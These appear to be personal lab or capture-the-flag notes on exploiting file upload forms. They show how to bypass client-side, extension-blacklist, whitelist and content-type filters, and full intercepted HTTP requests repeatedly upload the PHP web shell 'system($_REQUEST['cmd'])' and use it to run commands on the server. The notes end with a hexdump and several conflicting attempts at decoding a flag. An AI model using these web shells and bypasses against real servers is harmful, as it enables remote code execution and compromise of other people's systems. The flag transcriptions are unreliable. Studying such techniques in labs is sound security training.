File Upload


# Absent Validation
 

 echo "<?php echo gethostname(); ?>" > test.php

 upload the file and go to /uploads/test.php
 

# Upload Exploitation Web Shells

touch test2.php

nano test2.php

Copy:
```php

<?php system($_REQUEST['cmd']); ?>

```

upload the file and go to /uploads/test2.php?cmd=cat /flag.txt

# Client-Side Validation

- After poste a valid image to the upload 
- Intercept with burp and mofify the request like this:

```python
POST /upload.php HTTP/1.1
Host: 94.237.60.251:50697
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31070384352095504274360374143
Content-Length: 110908
Origin: http://94.237.60.251:50697
Connection: close
Referer: http://94.237.60.251:50697/

-----------------------------31070384352095504274360374143
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
-----------------------------31070384352095504274360374143--


```

upload the file and go to /profile_images/shell.php?cmd=cat /flag.txt


# Blacklist Filters

```shell
 wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

```
- Intercept the request on burp and send to intruder to brute force the extensions .php
- Next modify the request like this, after discovery the correct extension

```python

POST /upload.php HTTP/1.1
Host: 83.136.255.125:57766
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------100728475939235324011375106908
Content-Length: 262
Origin: http://83.136.255.125:57766
Connection: close
Referer: http://83.136.255.125:57766/

-----------------------------100728475939235324011375106908
Content-Disposition: form-data; name="uploadFile"; filename="shell.php8"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
-----------------------------100728475939235324011375106908--

```

upload the file and go to /profile_images/shell.php8?cmd=cat /flag.txt


# Blacklist Filters 

```shell
wget wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt

```
- Intercpet the request and send to intruder, next perform a brute force to the extensions with is wordlist web-extensions.txt
- Next modify the request like this, after discovery the correct extension

```python

POST /upload.php HTTP/1.1
Host: 94.237.60.75:45409
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------640482531457047109795953001
Content-Length: 255
Origin: http://94.237.60.75:45409
Connection: close
Referer: http://94.237.60.75:45409/

-----------------------------640482531457047109795953001
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------640482531457047109795953001--

```

upload the file and go to /profile_images/shell.phar?cmd=cat+/flag.txt

# Whitelist Filters

```shell
wget wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt

```

- Intercpet the request and send to intruder, next perform a brute force to the extensions with is wordlist web-extensions.txt
- Next modify the request like this, after discovery the correct extension

```
POST /upload.php HTTP/1.1
Host: 94.237.50.149:40146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------349202245540057470341937322530
Content-Length: 266
Origin: http://94.237.50.149:40146
Connection: close
Referer: http://94.237.50.149:40146/

-----------------------------349202245540057470341937322530
Content-Disposition: form-data; name="uploadFile"; filename="shell.phtml.gif"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------349202245540057470341937322530--


```

upload the file and go to /profile_images/shell.phtml.gif?cmd=cat+/flag.txt


# Type Filters

- The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image.

- Find what Content-Types are allowed

```shell
cp /usr/share/seclists/Miscellaneous/web/content-type.txt .
cat content-type.txt | grep 'image/' > image-content-types.txt

```

```python
POST /upload.php HTTP/1.1
Host: 94.237.50.149:40146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------349202245540057470341937322530
Content-Length: 266
Origin: http://94.237.50.149:40146
Connection: close
Referer: http://94.237.50.149:40146/

-----------------------------349202245540057470341937322530
Content-Disposition: form-data; name="uploadFile"; filename="shell.png.phtml"
Content-Type: image/png

GIF8
<?php system($_REQUEST['cmd']); ?>
-----------------------------349202245540057470341937322530--


```

# Limited File Uploads


 5b1b 3033 343b 6d30 2020 2020 2020 2020
 2020 2020 2020 2020 2020 2020 2020 2020
 2020 2020 2020 2020 5b1b 6d30 1b0a 345b
 6d30 2749 2064 756a 7473 6c20 6b69 2065
 6f74 6920 746e 7265 656a 7463 6620 726f
 6120 6d20 6d6f 6e65 2e74 5720 6168 2074
 6f79 2775 6572 7220 6665 7265 6972 676e
 7420 206f 7361 4c20 6e69 7875 202c 7369
 2020 690a 206e 6166 7463 202c 4e47 2f55
 694c 756e 2c78 6f20 2072 7361 4920 7627
 2065 6572 6563 746e 796c 7420 6b61 6e65
 7420 206f 6163 6c6c 6e69 2067 7469 202c
 4e47 2055 6c70 7375 4c20 6e69 7875 202e
 2020 0a20 694c 756e 2078 7369 6e20 746f
 6120 206e 706f 7265 7461 6e69 2067 7973
 7473 6d65 7520 746e 206f 7469 6573 666c
 202c 7562 2074 6172 6874 7265 6120 6f6e
 6874 7265 6620 6572 2065 6f63 706d 6e6f
 6e65 2074 6f0a 2066 2061 7566 6c6c 2079
 7566 636e 6974 6e6f 6e69 2067 4e47 2055
 7973 7473 6d65 6d20 6461 2065 7375 6665
 6c75 6220 2079 6874 2065 4e47 2055 6f63
 6572 696c 7362 202c 6873 6c65 206c 2020
 2020 2020 0a20 7475 6c69 7469 6569 2073
 6e61 2064 6976 6174 206c 7973 7473 6d65
 6320 6d6f 6f70 656e 746e 2073 6f63 706d
 6972 6973 676e 6120 6620 6c75 206c 534f
 6120 2073 6564 6966 656e 2064 7962 5020
 534f 5849 202e 200a 2020 2020 2020 2020
 2020 2020 2020 2020 2020 2020 2020 2020
 2020 2020 2020 0a20 614d 796e 6320 6d6f
 7570 6574 2072 7375 7265 2073 7572 206e
 2061 6f6d 6964 6966 6465 7620 7265 6973
 6e6f 6f20 2066 6874 2065 4e47 2055 7973
 7473 6d65 6520 6576 7972 6420 7961 202c
 6977 6874 756f 2074 720a 6165 696c 697a
 676e 6920 2e74 5420 7268 756f 6867 6120
 7020 6365 6c75 6169 2072 7574 6e72 6f20
 2066 7665 6e65 7374 202c 6874 2065 6576
 7372 6f69 206e 666f 4720 554e 7720 6968
 6863 6920 2073 2020 0a20 6977 6564 796c
 7520 6573 2064 6f74 6164 2079 7369 6f20
 7466 6e65 6320 6c61 656c 2064 694c 756e
 2c78 6120 646e 6d20 6e61 2079 666f 6920
 7374 7520 6573 7372 6120 6572 6e20 746f
 6120 6177 6572 2020 2020 740a 6168 2074
 7469 6920 2073 6162 6973 6163 6c6c 2079
 6874 2065 4e47 2055 7973 7473 6d65 202c
 6564 6576 6f6c 6570 2064 7962 7420 6568
 4720 554e 5020 6f72 656a 7463 202e 2020
 2020 2020 2020 2020 2020 1b20 305b 0a6d
 5b1b 3033 343b 6d30 2020 2020 2020 2020
 2020 2020 2020 2020 2020 2020 2020 2020
 2020 6c66 6761 317b 3666 6538 3130 6239
 3932 3536 6630 6536 6538 3161 6135 3837
 3830 3766 6636 7d64 5b1b 6d30 1b0a 345b
 6d30 6854 7265 2065 6572 6c61 796c 6920
 2073 2061 694c 756e 2c78 6120 646e 7420
 6568 6573 7020 6f65 6c70 2065 7261 2065
 7375 6e69 2067 7469 202c 7562 2074 7469
 6920 2073 756a 7473 6120 7020 7261 2074
 666f 740a 6568 7320 7379 6574 206d 6874
 7965 7520 6573 202e 694c 756e 2078 7369
 7420 6568 6b20 7265 656e 3a6c 7420 6568
 7020 6f72 7267 6d61 6920 206e 6874 2065
 7973 7473 6d65 7420 6168 2074 2020 2020
 2020 0a20 6c61 6f6c 6163 6574 2073 6874
 2065 616d 6863 6e69 2765 2073 6572 6f73
 7275 6563 2073 6f74 7420 6568 6f20 6874
 7265 7020 6f72 7267 6d61 2073 6874 7461
 7920 756f 7220 6e75 202e 6854 2065 656b
 6e72 6c65 690a 2073 6e61 6520 7373 6e65
 6974 6c61 7020 7261 2074 666f 6120 206e
 706f 7265 7461 6e69 2067 7973 7473 6d65
 202c 7562 2074 7375 6c65 7365 2073 7962
 6920 7374 6c65 3b66 6920 2074 6163 206e
 6e6f 796c 0a20 7566 636e 6974 6e6f 6920
 206e 6874 2065 6f63 746e 7865 2074 666f
 6120 6320 6d6f 6c70 7465 2065 706f 7265
 7461 6e69 2067 7973 7473 6d65 202e 694c
 756e 2078 7369 6e20 726f 616d 6c6c 2079
 7375 6465 2020 690a 206e 6f63 626d 6e69
 7461 6f69 206e 6977 6874 7420 6568 4720
 554e 6f20 6570 6172 6974 676e 7320 7379
 6574 3a6d 7420 6568 7720 6f68 656c 7320
 7379 6574 206d 7369 6220 7361 6369 6c61
 796c 4720 554e 0a20 6977 6874 4c20 6e69
 7875 6120 6464 6465 202c 726f 4720 554e
 4c2f 6e69 7875 202e 6c41 206c 6874 2065
 6f73 632d 6c61 656c 2064 694c 756e 2078
 6964 7473 6972 7562 6974 6e6f 2073 7261
 2065 6572 6c61 796c 640a 7369 7274 6269
 7475 6f69 736e 6f20 2066 4e47 2f55 694c
 756e 2178 2020 2020 2020 2020 2020 2020
 2020 2020 2020 2020 2020 2020 2020 2020
 2020 2020 2020 2020 1b20 305b 0a6d 5b1b
 3033 343b 6d30 2020 2020 2020 2020 2020
 2020 2020 2020 2020 2020 2020 2020 2020
 2020 2020 2020 5b1b 6d30 000a          


6c 66 67 61 31 7b 36 66 65 38 31 30 62 39 39 32 35 36 66 30 65 36 65 38 31 61 61 35 38 37 38 30 37 66 66 36 7d

lfga1{6fe810b99256f0e6e81aa587807ff6}  

1. 

flga1{6fe810b99256f0e6e81aa587807ff6}  

flag1{6fe810b99256f0e6e81aa587807ff6}

flag{16fe810b99256f0e6e81aa587807ff6}

2.
flag{1f68e019b29650f6e8ea15187807ff6}

flag{1f68e019b29650f6e8ea15a7808f76f}